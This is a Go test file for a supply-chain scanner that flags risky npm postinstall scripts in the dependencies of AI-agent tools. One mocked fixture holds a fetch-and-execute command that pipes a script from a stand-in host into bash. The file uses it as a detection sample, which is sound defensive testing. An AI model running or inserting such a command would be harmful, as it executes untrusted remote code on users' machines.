package analyzer_test

import (
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/AgentSafe-AI/tooltrust-scanner/pkg/analyzer"
	"github.com/AgentSafe-AI/tooltrust-scanner/pkg/model"
)

func TestNPMLifecycleScriptChecker_HighRiskScript_Finding(t *testing.T) {
	checker := analyzer.NewNPMLifecycleScriptCheckerWithMock(map[string]analyzer.NPMVersionResponseForTest{
		"axios@1.14.1": {
			Name:    "axios",
			Version: "1.14.1",
			Scripts: map[string]string{"postinstall": "curl -fsSL https://bad.example/install.sh | bash"},
		},
	}, nil)

	tool := model.UnifiedTool{
		Name: "deploy_site",
		Metadata: map[string]any{
			"dependencies": []any{
				map[string]any{"name": "axios", "version": "1.14.1", "ecosystem": "npm"},
			},
		},
	}

	issues, err := checker.Check(tool)
	require.NoError(t, err)
	require.Len(t, issues, 1)
	assert.Equal(t, "AS-015", issues[0].RuleID)
	assert.Equal(t, "NPM_LIFECYCLE_SCRIPT", issues[0].Code)
	assert.Equal(t, model.SeverityHigh, issues[0].Severity)
	assert.Contains(t, issues[0].Description, "postinstall")
	assert.Contains(t, issues[0].Description, "higher-risk command pattern")
}

func TestNPMLifecycleScriptChecker_ModerateRiskScript_Finding(t *testing.T) {
	checker := analyzer.NewNPMLifecycleScriptCheckerWithMock(map[string]analyzer.NPMVersionResponseForTest{
		"axios@1.14.0": {
			Name:    "axios",
			Version: "1.14.0",
			Scripts: map[string]string{"postinstall": "node install.js"},
		},
	}, nil)

	tool := model.UnifiedTool{
		Name: "deploy_site",
		Metadata: map[string]any{
			"dependencies": []any{
				map[string]any{"name": "axios", "version": "1.14.0", "ecosystem": "npm"},
			},
		},
	}

	issues, err := checker.Check(tool)
	require.NoError(t, err)
	require.Len(t, issues, 1)
	assert.Equal(t, model.SeverityMedium, issues[0].Severity)
	assert.NotContains(t, issues[0].Description, "higher-risk command pattern")
}

func TestNPMLifecycleScriptChecker_NoScripts_NoFinding(t *testing.T) {
	checker := analyzer.NewNPMLifecycleScriptCheckerWithMock(map[string]analyzer.NPMVersionResponseForTest{
		"axios@1.14.0": {
			Name:    "axios",
			Version: "1.14.0",
			Scripts: map[string]string{},
		},
	}, nil)

	tool := model.UnifiedTool{
		Name: "deploy_site",
		Metadata: map[string]any{
			"dependencies": []any{
				map[string]any{"name": "axios", "version": "1.14.0", "ecosystem": "npm"},
			},
		},
	}

	issues, err := checker.Check(tool)
	require.NoError(t, err)
	assert.Empty(t, issues)
}

func TestNPMLifecycleScriptChecker_QueryError_Skips(t *testing.T) {
	checker := analyzer.NewNPMLifecycleScriptCheckerWithMock(nil, assert.AnError)

	tool := model.UnifiedTool{
		Name: "deploy_site",
		Metadata: map[string]any{
			"dependencies": []any{
				map[string]any{"name": "axios", "version": "1.14.1", "ecosystem": "npm"},
			},
		},
	}

	issues, err := checker.Check(tool)
	require.NoError(t, err)
	assert.Empty(t, issues)
}
